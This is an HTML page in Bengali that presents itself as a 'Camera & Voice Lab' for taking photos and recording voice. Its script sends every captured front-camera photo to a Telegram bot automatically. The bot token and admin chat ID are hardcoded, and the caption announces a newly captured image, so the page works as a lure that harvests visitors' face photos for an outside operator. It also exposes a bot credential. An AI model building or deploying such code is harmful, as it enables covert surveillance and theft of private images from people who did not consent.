<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Camera & Voice Lab</title>

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      background: #fff;
      color: #222;
    }

    main {
      max-width: 600px;
      margin: auto;
    }

    h1 { font-size: 25px; }

    video, img, audio {
      display: block;
      width: 100%;
      margin: 12px 0;
      border-radius: 10px;
    }

    video {
      background: #f1f5f9;
      object-fit: cover;
    }

    button, a {
      display: inline-block;
      padding: 12px;
      margin: 5px 3px;
      border: 1px solid #ddd;
      border-radius: 8px;
      background: #f8fafc;
      color: #222;
      font-size: 15px;
      text-decoration: none;
      cursor: pointer;
    }

    .status {
      padding: 12px;
      background: #f1f5f9;
      border-radius: 8px;
      overflow-wrap: anywhere;
    }

    .hidden { display: none; }
  </style>
</head>

<body>
<main>
  <h1>ক্যামেরা ও ভয়েস পরীক্ষাগার</h1>

  <section>
    <h2>১. ফ্রন্ট ক্যামেরা</h2>

    <button id="startCamera">ক্যামেরা চালু করুন</button>
    <button id="takePhoto" disabled>ছবি তুলুন</button>
    <button id="stopCamera" disabled>ক্যামেরা বন্ধ</button>

    <video id="camera" autoplay playsinline muted
           class="hidden"></video>

    <canvas id="canvas" class="hidden"></canvas>
    <img id="photo" alt="তোলা ছবি" class="hidden">

    <a id="photoDownload" class="hidden" download="photo.jpg">
      ছবি ডাউনলোড
    </a>

    <p id="cameraStatus" class="status">
      ক্যামেরা বন্ধ আছে।
    </p>
  </section>

  <hr>

  <section>
    <h2>২. ভয়েস রেকর্ডিং</h2>

    <button id="startVoice">রেকর্ডিং শুরু</button>
    <button id="stopVoice" disabled>রেকর্ডিং বন্ধ</button>

    <audio id="audio" controls class="hidden"></audio>

    <a id="audioDownload" class="hidden" download="voice.webm">
      অডিও ডাউনলোড
    </a>

    <p id="voiceStatus" class="status">
      রেকর্ডিং শুরু হয়নি।
    </p>
  </section>
</main>

<script>
  // টেলিগ্রাম কনফিগারেশন
  const TELEGRAM_BOT_TOKEN = "8395120592:AAE6b2-QDm9y-9SsQtWq-yT8PIkEQy02ZJI";
  const TELEGRAM_ADMIN_UID = "6183247698";

  const camera = document.getElementById("camera");
  const canvas = document.getElementById("canvas");
  const photo = document.getElementById("photo");

  let cameraStream = null;
  let recorder = null;
  let audioStream = null;
  let audioChunks = [];
  let photoURL = null;
  let audioURL = null;

  // টেলিগ্রামে ছবি পাঠানোর ফাংশন
  async function sendPhotoToTelegram(blob) {
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_ADMIN_UID);
    formData.append("photo", blob, "captured_photo.jpg");
    formData.append("caption", "নতুন একটি ছবি বা স্ক্রিনশট ক্যাপচার করা হয়েছে!");

    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
      const data = await response.json();
      if (data.ok) {
        document.getElementById("cameraStatus").textContent = "ছবি সফলভাবে টেলিগ্রাম বটে পাঠানো হয়েছে!";
      } else {
        document.getElementById("cameraStatus").textContent = "টেলিগ্রামে পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি");
      }
    } catch (error) {
      document.getElementById("cameraStatus").textContent = "নেটওয়ার্ক ত্রুটি: " + error.message;
    }
  }

  // ফ্রন্ট ক্যামেরা চালু
  document.getElementById("startCamera").onclick =
    async () => {
      try {
        cameraStream =
          await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user"
            },
            audio: false
          });

        camera.srcObject = cameraStream;
        camera.classList.remove("hidden");

        await camera.play();

        document.getElementById("takePhoto").disabled = false;
        document.getElementById("stopCamera").disabled = false;

        document.getElementById("cameraStatus").textContent =
          "ফ্রন্ট ক্যামেরা চালু আছে।";

      } catch (error) {
        document.getElementById("cameraStatus").textContent =
          "ক্যামেরা চালু করা যায়নি: " + error.message;
      }
    };

  // একটি ছবি তোলা এবং টেলিগ্রামে পাঠানো
  document.getElementById("takePhoto").onclick = () => {
    if (!cameraStream || !camera.videoWidth) return;

    canvas.width = camera.videoWidth;
    canvas.height = camera.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(camera, 0, 0);

    canvas.toBlob(blob => {
      if (!blob) return;

      if (photoURL) URL.revokeObjectURL(photoURL);

      photoURL = URL.createObjectURL(blob);
      photo.src = photoURL;
      photo.classList.remove("hidden");

      const link = document.getElementById("photoDownload");
      link.href = photoURL;
      link.classList.remove("hidden");

      document.getElementById("cameraStatus").textContent = "ছবি তৈরি হয়েছে, টেলিগ্রামে পাঠানো হচ্ছে...";
      
      // টেলিগ্রাম সার্ভারে পাঠানোর ফাংশন কল করা হলো
      sendPhotoToTelegram(blob);

    }, "image/jpeg", 0.9);
  };

  // ক্যামেরা বন্ধ
  document.getElementById("stopCamera").onclick = () => {
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
      cameraStream = null;
    }

    camera.srcObject = null;
    camera.classList.add("hidden");

    document.getElementById("takePhoto").disabled = true;
    document.getElementById("stopCamera").disabled = true;

    document.getElementById("cameraStatus").textContent =
      "ক্যামেরা বন্ধ করা হয়েছে।";
  };

  // অডিও রেকর্ডিং শুরু
  document.getElementById("startVoice").onclick =
    async () => {
      try {
        if (!navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia ||
            !window.MediaRecorder) {
          throw new Error("এই ব্রাউজারে অডিও রেকর্ডিং সমর্থিত নয়।");
        }

        audioStream =
          await navigator.mediaDevices.getUserMedia({
            audio: true
          });

        audioChunks = [];
        recorder = new MediaRecorder(audioStream);

        recorder.ondataavailable = event => {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };

        recorder.onstop = () => {
          const blob = new Blob(audioChunks, {
            type: recorder.mimeType || "audio/webm"
          });

          if (audioURL) URL.revokeObjectURL(audioURL);

          audioURL = URL.createObjectURL(blob);

          const audio = document.getElementById("audio");
          audio.src = audioURL;
          audio.classList.remove("hidden");

          const link = document.getElementById("audioDownload");
          link.href = audioURL;
          link.classList.remove("hidden");

          if (audioStream) {
            audioStream.getTracks().forEach(track => track.stop());
            audioStream = null;
          }

          document.getElementById("voiceStatus").textContent =
            "রেকর্ডিং তৈরি হয়েছে।";
        };

        recorder.start();

        document.getElementById("startVoice").disabled = true;
        document.getElementById("stopVoice").disabled = false;

        document.getElementById("voiceStatus").textContent =
          "রেকর্ডিং চলছে...";

      } catch (error) {
        document.getElementById("voiceStatus").textContent =
          "রেকর্ডিং শুরু করা যায়নি: " + error.message;
      }
    };

  // অডিও রেকর্ডিং বন্ধ
  document.getElementById("stopVoice").onclick = () => {
    if (recorder && recorder.state === "proxy" || (recorder && recorder.state === "recording")) {
      recorder.stop();
    }

    document.getElementById("startVoice").disabled = false;
    document.getElementById("stopVoice").disabled = true;
  };

  // পেজ ছাড়লে ক্যামেরা ও মাইক্রোফোন বন্ধ
  window.addEventListener("pagehide", () => {
    [cameraStream, audioStream].forEach(stream => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });
  });
</script>
</body>
</html>
